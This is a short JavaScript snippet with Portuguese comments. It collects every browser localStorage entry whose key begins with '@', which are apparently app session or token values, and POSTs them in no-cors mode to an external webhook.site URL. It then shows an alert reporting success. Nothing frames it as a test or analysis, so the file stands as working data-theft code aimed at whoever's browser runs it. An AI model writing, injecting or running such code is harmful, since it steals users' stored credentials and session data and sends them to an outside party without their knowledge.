const webhookUrl = 'https://webhook.site/4de39267-4245-4c37-8887-0755b521d052';

let dados = [];

for (let i = 0; i < localStorage.length; i++) {
  let chave = localStorage.key(i);
  if (chave.startsWith('@')) {
    let valor = localStorage.getItem(chave);
    dados.push({ chave, valor });
  }
}

fetch(webhookUrl, {
  method: 'POST',
  mode: 'no-cors', // Adiciona o modo no-cors para evitar o bloqueio
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify(dados)
})
.then(() => alert("O script foi executado com sucesso!"))
.catch(error => console.error("Erro ao enviar os dados:", error));

export {};
